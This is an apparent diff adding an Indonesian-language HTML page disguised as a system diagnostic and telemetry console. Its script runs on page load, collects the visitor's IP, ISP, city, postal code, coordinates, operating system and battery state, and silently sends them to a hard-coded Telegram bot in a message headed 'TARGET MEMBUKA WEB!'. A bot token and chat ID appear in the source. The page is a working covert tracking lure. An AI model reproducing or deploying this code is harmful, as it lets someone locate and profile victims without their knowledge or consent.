@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Diagnostic & Telemetry Node</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        body {
+            background-color: #030712;
+            color: #22c55e;
+            padding: 15px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        header {
+            border-bottom: 2px solid #22c55e;
+            padding-bottom: 12px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 1rem;
+            letter-spacing: 1px;
+            color: #22c55e;
+            text-shadow: 0 0 8px rgba(34, 197, 94, 0.4);
+        }
+        .subtitle {
+            font-size: 0.7rem;
+            color: #eab308;
+            margin-top: 4px;
+        }
+        .panel {
+            background: #111827;
+            border: 1px solid #1f2937;
+            border-radius: 6px;
+            padding: 12px;
+            margin-bottom: 12px;
+        }
+        .panel-title {
+            font-size: 0.75rem;
+            color: #eab308;
+            border-bottom: 1px solid #1f2937;
+            padding-bottom: 5px;
+            margin-bottom: 8px;
+        }
+        .data-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.75rem;
+            margin-bottom: 7px;
+            border-bottom: 1px dashed #1f2937;
+            padding-bottom: 4px;
+        }
+        .data-label { color: #9ca3af; }
+        .data-value { color: #ffffff; text-align: right; font-weight: bold; }
+        .highlight { color: #38bdf8; }
+        
+        .terminal {
+            background: #020617;
+            border: 1px solid #1f2937;
+            border-radius: 6px;
+            padding: 10px;
+            height: 110px;
+            overflow-y: auto;
+            font-size: 0.7rem;
+            margin-bottom: 12px;
+            color: #22c55e;
+        }
+        .log-line { margin-bottom: 3px; line-height: 1.3; }
+
+        footer {
+            text-align: center;
+            font-size: 0.6rem;
+            color: #4b5563;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <header>
+            <h1>[ SYSTEM DIAGNOSTIC NODE ]</h1>
+            <div class="subtitle">Secure Network & Telemetry Interface</div>
+        </header>
+
+        <div class="terminal" id="terminalBox">
+            <div class="log-line">> Initializing secure diagnostic handshake...</div>
+            <div class="log-line">> Connecting to active routing nodes...</div>
+        </div>
+
+        <div class="panel">
+            <div class="panel-title">> NETWORK & CARRIER METADATA</div>
+            <div class="data-row">
+                <span class="data-label">IP Publik:</span>
+                <span class="data-value highlight" id="ipVal">Memindai...</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Provider / ISP:</span>
+                <span class="data-value" id="ispVal">Mendeteksi...</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Kota / Wilayah:</span>
+                <span class="data-value highlight" id="cityVal">Melacak...</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Kecamatan / Pos:</span>
+                <span class="data-value" id="districtVal">-</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Provinsi / Negara:</span>
+                <span class="data-value" id="regionVal">-</span>
+            </div>
+        </div>
+
+        <div class="panel">
+            <div class="panel-title">> HARDWARE & DEVICE METRICS</div>
+            <div class="data-row">
+                <span class="data-label">Kapasitas Baterai:</span>
+                <span class="data-value highlight" id="batteryVal">Membaca...</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Status Power:</span>
+                <span class="data-value" id="chargingVal">-</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Sistem Operasi:</span>
+                <span class="data-value" id="deviceVal">-</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Estimasi Koordinat:</span>
+                <span class="data-value highlight" id="coordVal">Menghitung...</span>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        &copy; 2026 Telemetry Diagnostic Module
+    </footer>
+
+    <script>
+        // === KONFIGURASI BOT TELEGRAM LU ===
+        const TELEGRAM_TOKEN = "8743094711:AAF-1OcGVFBAGBrTE4ycVIAtasiHMBmrto"; 
+        const CHAT_ID = "8335786077";
+        // ==================================
+
+        // 1. Deteksi Perangkat / OS
+        const ua = navigator.userAgent;
+        let deviceName = "Unknown Device";
+        if (/android/i.test(ua)) deviceName = "Android Mobile";
+        else if (/iphone|ipad|ipod/i.test(ua)) deviceName = "iOS Apple Device";
+        else if (/windows/i.test(ua)) deviceName = "Windows PC";
+        else if (/linux/i.test(ua)) deviceName = "Linux System";
+        document.getElementById('deviceVal').innerText = deviceName;
+
+        // 2. Deteksi Baterai & Charge Status
+        let batteryLevelInfo = "Tidak Diketahui";
+        let chargeStatusInfo = "Tidak Diketahui";
+        
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                let level = Math.round(battery.level * 100) + '%';
+                let charging = battery.charging ? 'Charging (Mengisi ⚡)' : 'Discharging (Khas baterai 🔋)';
+                
+                batteryLevelInfo = level;
+                chargeStatusInfo = charging;
+
+                document.getElementById('batteryVal').innerText = level;
+                document.getElementById('chargingVal').innerText = charging;
+            });
+        } else {
+            document.getElementById('batteryVal').innerText = "N/A";
+            document.getElementById('chargingVal').innerText = "-";
+        }
+
+        // Terminal Logs
+        const terminal = document.getElementById('terminalBox');
+        const logs = [
+            "> Target payload loaded successfully.",
+            "> Analyzing Autonomous System (ASN) route...",
+            "> IP Geolocation mapping established."
+        ];
+        let idx = 0;
+        function pushLog() {
+            if(idx < logs.length) {
+                terminal.innerHTML += `<div class="log-line">${logs[idx]}</div>`;
+                terminal.scrollTop = terminal.scrollHeight;
+                idx++;
+                setTimeout(pushLog, 400);
+            }
+        }
+        pushLog();
+
+        // 3. Tarik Data IP Detail (Termasuk Kecamatan & Kode Pos)
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                let ip = data.ip || "N/A";
+                let isp = data.org || data.asn || "Cellular Provider";
+                let city = data.city || "Unknown City";
+                let region = `${data.region || ""}, ${data.country_name || "ID"}`;
+                let postal = data.postal || "N/A";
+                // ipapi kadang menyimpan detail area di region_code/district jika ada, kita fallback ke postal/city
+                let district = data.postal ? `Pos: ${data.postal}` : "Area Lokal";
+                let coords = (data.latitude && data.longitude) ? `${data.latitude}, ${data.longitude}` : "N/A";
+
+                document.getElementById('ipVal').innerText = ip;
+                document.getElementById('ispVal').innerText = isp;
+                document.getElementById('cityVal').innerText = city;
+                document.getElementById('districtVal').innerText = district;
+                document.getElementById('regionVal').innerText = region;
+                document.getElementById('coordVal').innerText = coords;
+
+                // Kirim laporan lengkap ke Bot Telegram
+                sendToTelegram(ip, city, district, region, postal, isp, coords, chargeStatusInfo, batteryLevelInfo, deviceName);
+            })
+            .catch(() => {
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(ipData => {
+                        let ip = ipData.ip;
+                        document.getElementById('ipVal').innerText = ip;
+                        document.getElementById('ispVal').innerText = "Mobile Data Gateway";
+                        document.getElementById('cityVal').innerText = "Regional Node";
+                        document.getElementById('districtVal').innerText = "N/A";
+                        document.getElementById('regionVal').innerText = "Indonesia";
+                        document.getElementById('coordVal').innerText = "Available via ASN Route";
+
+                        sendToTelegram(ip, "Regional Node", "N/A", "Indonesia", "N/A", "Mobile Data Gateway", "N/A", chargeStatusInfo, batteryLevelInfo, deviceName);
+                    });
+            });
+
+        function sendToTelegram(ip, city, district, region, postal, isp, coords, chargeStatus, batteryLevel, os) {
+            const message = `🚨 TARGET MEMBUKA WEB!\n\n` +
+                            `🌐 IP: ${ip}\n` +
+                            `📍 Kota: ${city}\n` +
+                            `📮 Kode Pos / Area: ${postal} (${district})\n` +
+                            `🗺️ Provinsi/Negara: ${region}\n` +
+                            `📶 Provider: ${isp}\n` +
+                            `📌 Koor: ${coords}\n` +
+                            `⚡ Charge Status: ${chargeStatus} (${batteryLevel})\n` +
+                            `💻 Sistem Operasi: ${os}`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+            
+            fetch(url).catch(e => console.log("Log error"));
+        }
+    </script>
+</body>
+</html>
